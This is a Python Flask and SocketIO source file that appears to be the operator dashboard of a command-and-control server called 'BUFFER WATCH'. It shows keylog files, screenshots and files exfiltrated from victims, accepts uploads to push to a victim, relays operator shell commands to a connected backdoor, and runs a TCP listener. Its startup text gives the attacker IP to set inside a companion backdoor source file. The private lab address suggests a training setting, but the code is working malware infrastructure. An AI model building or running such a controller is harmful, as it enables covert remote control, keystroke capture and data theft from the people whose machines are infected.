import eventlet
eventlet.monkey_patch()

import os
import sys
from flask import Flask, render_template, send_from_directory, request, jsonify
from flask_socketio import SocketIO
from werkzeug.utils import secure_filename
import c2_handler

# Fix Windows console encoding
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# ── Flask app ────────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(__name__,
            template_folder=os.path.join(BASE_DIR, "templates"),
            static_folder=os.path.join(BASE_DIR, "static"))
app.config["SECRET_KEY"] = "bufferwatch-secret-key-change-me"

socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet",
                    logger=False, engineio_logger=False)

# Give the handler a reference so it can emit events
c2_handler.set_socketio(socketio)


# ── Routes ───────────────────────────────────────────────────────────
@app.route("/")
def index():
    return render_template("index.html")


@app.route("/screenshots/<path:filename>")
def serve_screenshot(filename):
    return send_from_directory(c2_handler.SCREENSHOT_DIR, filename)


@app.route("/downloads/<path:filename>")
def serve_download(filename):
    return send_from_directory(c2_handler.DOWNLOAD_DIR, filename, as_attachment=True)


@app.route("/api/downloads")
def api_downloads():
    """Return a list of downloaded files."""
    files = []
    if os.path.isdir(c2_handler.DOWNLOAD_DIR):
        files = sorted(os.listdir(c2_handler.DOWNLOAD_DIR), reverse=True)
    return jsonify({"files": files})


@app.route("/upload", methods=["POST"])
def upload_file():
    """Handle file uploads from the browser -> saved to uploads/ for later push to victim."""
    if "file" not in request.files:
        return jsonify({"error": "No file part"}), 400
    f = request.files["file"]
    if f.filename == "":
        return jsonify({"error": "No selected file"}), 400
    filename = secure_filename(f.filename)
    save_path = os.path.join(c2_handler.UPLOAD_DIR, filename)
    f.save(save_path)
    return jsonify({"message": f"File '{filename}' saved to uploads/", "filename": filename})


@app.route("/api/status")
def api_status():
    return jsonify(c2_handler.get_status())


@app.route("/api/keylogs")
def api_keylogs():
    """Return a list of saved keylog files."""
    files = []
    if os.path.isdir(c2_handler.KEYLOG_DIR):
        files = sorted(os.listdir(c2_handler.KEYLOG_DIR), reverse=True)
    return jsonify({"files": files})


@app.route("/api/keylogs/<path:filename>")
def api_keylog_content(filename):
    filepath = os.path.join(c2_handler.KEYLOG_DIR, filename)
    if not os.path.isfile(filepath):
        return jsonify({"error": "Not found"}), 404
    with open(filepath, "r", errors="ignore") as f:
        content = f.read()
    return jsonify({"content": content})


# ── SocketIO events ──────────────────────────────────────────────────
@socketio.on("connect")
def on_connect():
    """When a browser tab connects, push the current status."""
    status = c2_handler.get_status()
    socketio.emit("status_update", status)


@socketio.on("send_command")
def on_send_command(data):
    cmd = data.get("command", "").strip()
    if not cmd:
        return
    # Echo the command in the console
    socketio.emit("command_output", {"output": f"$ {cmd}"})
    # Run in a background task so it doesn't block SocketIO
    socketio.start_background_task(c2_handler.send_command, cmd)


# ── Entry point ──────────────────────────────────────────────────────
if __name__ == "__main__":
    attacker_ip = "192.168.56.104"

    print("  +========================================================+")
    print("  |   BUFFER WATCH - Web Dashboard                         |")
    print(f"  |   Dashboard URL:  http://{attacker_ip}:5000            |")
    print(f"  |   C2 TCP Port:    {attacker_ip}:50005                  |")
    print("  |                                                        |")
    print(f"  |   [!] CONFIGURED IP FOR backdoor3o.c:                  |")
    print(f'  |       char ip_plain[] = "{attacker_ip}";            |')
    print("  +========================================================+")
    print("")

    # Start TCP listener on ALL interfaces (0.0.0.0)
    socketio.start_background_task(c2_handler.start_listener, "0.0.0.0", 50005)

    socketio.run(app, host=attacker_ip, port=5000, debug=False, use_reloader=False)
